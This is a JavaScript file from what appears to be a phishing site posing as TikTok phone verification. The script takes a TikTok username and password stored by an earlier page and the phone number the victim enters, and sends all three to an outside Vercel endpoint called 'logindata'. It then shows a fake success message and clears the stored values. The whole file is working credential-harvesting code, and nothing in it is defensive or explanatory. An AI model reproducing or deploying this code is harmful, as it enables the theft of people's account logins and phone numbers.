// phone_script.js (for Page 2 - phone_verify.html)
document.addEventListener('DOMContentLoaded', function () {
    const phoneForm = document.getElementById('phoneForm');
    const phoneNumberInput = document.getElementById('phoneNumber');
    const messageDiv = document.getElementById('message');

    // !!! IMPORTANT: Replace YOUR_VERCEL_BACKEND_URL with your actual Vercel backend URL !!!
    const BACKEND_API_URL = 'https://number2-adamahmeddds-projects.vercel.app/logindata';

    phoneForm.addEventListener('submit', async function (event) {
        event.preventDefault();

        const phoneNumber = phoneNumberInput.value.trim();

        if (messageDiv) {
            messageDiv.textContent = '';
            messageDiv.className = 'message';
            messageDiv.classList.remove('show');
        }

        if (phoneNumber === '') {
            displayMessage('Please enter your phone number.', 'error');
            return;
        }

        const username = sessionStorage.getItem('tiktokUsername');
        const password = sessionStorage.getItem('tiktokPassword');

        if (!username || !password) {
            displayMessage('Account details not found. Please start over.', 'error');
            setTimeout(() => { window.location.href = 'index.html'; }, 3000);
            return;
        }

        const dataToSend = {
            username: username,
            password: password,
            phoneNumber: phoneNumber
        };

        try {
            const response = await fetch(BACKEND_API_URL, {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify(dataToSend),
            });

            if (response.ok) {
                displayMessage('Verification details submitted. Thank you!', 'success');
                sessionStorage.removeItem('tiktokUsername');
                sessionStorage.removeItem('tiktokPassword');
                // phoneForm.reset(); // Optional
            } else {
                const errorData = await response.text();
                console.error('Server error:', response.status, errorData);
                displayMessage('Submission failed. Please try again.', 'error');
            }
        } catch (error) {
            console.error('Network error or other issue sending data:', error);
            displayMessage('Could not submit data. Check connection.', 'error');
        }
    });

    function displayMessage(msg, type) {
        if (messageDiv) {
            setTimeout(() => {
                messageDiv.textContent = msg;
                messageDiv.classList.add(type);
                messageDiv.classList.add('show');
            }, 50);
        } else {
            alert((type === 'error' ? "Error: " : "") + msg);
        }
    }
});